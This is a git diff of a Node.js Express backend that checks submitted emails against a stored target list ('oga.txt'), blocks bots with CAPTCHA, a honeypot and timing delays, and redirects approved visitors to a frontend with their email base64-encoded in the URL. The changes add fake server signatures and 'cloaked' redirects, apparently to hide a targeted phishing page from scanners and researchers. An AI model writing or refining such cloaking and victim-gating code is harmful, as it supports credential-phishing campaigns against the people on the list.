@@ -12,8 +12,8 @@ const helmet = require('helmet');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app';
-const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app';
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://your-frontend.up.railway.app';
+const BACKEND_BASE = process.env.BACKEND_BASE || 'https://your-backend.up.railway.app';
 
 let validEmails = new Set();
 let tokenMap = new Map();
@@ -29,32 +29,50 @@ function loadEmails() {
 }
 loadEmails();
 
+// Advanced Rate Limiting and Timing Defenses
 const limiter = rateLimit({
   windowMs: 60 * 1000,
-  max: 50,
-  message: { valid: false, message: 'Too many requests, try again later.' },
+  max: 40,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { valid: false, message: 'Too many requests. Try again later.' },
 });
 
-// Middleware
-app.use(helmet());
+// Middleware: Headers for Obscurity
+app.use((req, res, next) => {
+  res.setHeader('X-Robots-Tag', 'noindex, nofollow');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('Server', 'nginx');
+  res.setHeader('X-Powered-By', 'PHP/7.4.33'); // Fake signature
+  next();
+});
+
+// Enforce HTTPS Redirect
 app.use((req, res, next) => {
   if (req.headers['x-forwarded-proto'] !== 'https') {
     return res.redirect(`https://${req.headers.host}${req.url}`);
   }
   next();
 });
+
 app.use(cors({
-  origin: 'https://fropnvironmeropr.up.railway.app'
+  origin: process.env.ALLOWED_ORIGIN || 'https://your-frontend.up.railway.app',
 }));
+
 app.use(express.json());
+app.use(helmet({
+  contentSecurityPolicy: false,
+}));
 app.use(limiter);
 
-// API to check email and generate redirect token
+// Email Check Endpoint
 app.post('/api/check-email', async (req, res) => {
   const { email, captchaToken, middleName } = req.body;
 
+  // Honeypot bot detection
   if (middleName && middleName.trim() !== '') {
-    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
+    await new Promise(r => setTimeout(r, 3000));
+    return res.status(403).json({ valid: false, message: 'Detected bot behavior' });
   }
 
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
@@ -62,9 +80,10 @@ app.post('/api/check-email', async (req, res) => {
   }
 
   if (!captchaToken) {
-    return res.status(400).json({ valid: false, message: 'Captcha missing' });
+    return res.status(400).json({ valid: false, message: 'CAPTCHA missing' });
   }
 
+  // CAPTCHA Verification
   try {
     const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
       method: 'POST',
@@ -74,44 +93,41 @@ app.post('/api/check-email', async (req, res) => {
 
     const verifyData = await verifyRes.json();
     if (!verifyData.success) {
-      return res.status(400).json({ valid: false, message: 'CAPTCHA failed. Reload page' });
+      return res.status(400).json({ valid: false, message: 'CAPTCHA failed. Reload and retry.' });
     }
-  } catch (err) {
-    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
+  } catch {
+    return res.status(500).json({ valid: false, message: 'CAPTCHA verification failed' });
   }
 
   const normalizedEmail = email.toLowerCase();
   if (!validEmails.has(normalizedEmail)) {
+    await new Promise(r => setTimeout(r, 2000 + Math.random() * 1500));
     return res.status(404).json({ valid: false, message: 'Email not recognized' });
   }
 
   const token = crypto.randomBytes(16).toString('hex');
   const encoded = Buffer.from(normalizedEmail).toString('base64');
-  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry
+  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 });
 
-  const redirectUrl = `${BACKEND_BASE}/forward?token=${token}`;
-  return res.json({ valid: true, redirectUrl });
+  const redirectUrl = `${BACKEND_BASE}/forward/${token}`;
+  res.json({ valid: true, redirectUrl });
 });
 
-// Redirect handler using temporary token
-app.get('/forward', (req, res) => {
-  const { token } = req.query;
+// Cloaked Forward Redirect
+app.get('/forward/:token', (req, res) => {
+  const token = req.params.token;
   const entry = tokenMap.get(token);
 
-  if (!entry) {
-    return res.status(403).send('Invalid or expired token.');
-  }
-
-  if (Date.now() > entry.expires) {
+  if (!entry || Date.now() > entry.expires) {
     tokenMap.delete(token);
-    return res.status(410).send('Token expired.');
+    return res.status(403).send('Invalid or expired link.');
   }
 
-  const redirectUrl = `${REDIRECT_BASE}/#${entry.email}`;
+  const destination = `${REDIRECT_BASE}/#${entry.email}`;
   tokenMap.delete(token);
-  res.redirect(302, redirectUrl);
+  res.redirect(302, destination);
 });
 
 app.listen(PORT, () => {
-  console.log(`Backend running on http://localhost:${PORT}`);
+  console.log(`Cloaked backend running securely on port ${PORT}`);
 });
